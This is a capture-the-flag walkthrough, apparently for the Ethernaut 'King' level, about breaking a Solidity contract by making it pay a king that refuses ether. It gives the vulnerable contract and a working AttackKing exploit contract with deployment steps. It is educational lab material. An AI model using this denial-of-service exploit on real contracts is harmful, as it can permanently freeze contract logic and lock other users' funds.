---
description: breaking contract logic by not allowing to receive ether
---

# 9 - King

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

### Goal of this level

* Break the contract

### What you should know before

* How a contract can receive ether\
  1\. **payable** `fallback()` function\
  2\. `receive()` function\
  \-> see [here](https://youtu.be/qtLI7K1L1bg)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

king variable will never be updated if the previous king refuse to receive ether

</details>

```solidity
receive() external payable {
  require(msg.value >= prize || msg.sender == owner);
  payable(king).transfer(msg.value); // make it revert here
  king = msg.sender;
  prize = msg.value;
}
```

We will send **`King`** contract the amount of value that is greater or equal to `prize` and do not implement any **method to receive ether**.

Then no matter how much the future player sends to **`King`** contract,\
value of `king` variable never be updated because the transaction will always **revert** when trying to send ether to previous king.

Use Remix IDE!

```solidity
contract AttackKing {
    address king;

    constructor(address _instanceAddr) payable {
        king = _instanceAddr;
    }

    function attack() external {
        (bool success, ) = payable(king).call{value: address(this).balance}("");
        require(success);
    }
}
```

```java
> (await contract.prize()).toString();
'1000000000000000'
```

Deploy **`AttackKing`** contract with `'1000000000000000' wei`\
and call `attack()` function.

Done! 😎

## Key Takeways

* There is 2 ways of receiving ether.\
  1\. payable `fallback()`\
  ``2. `receive()`
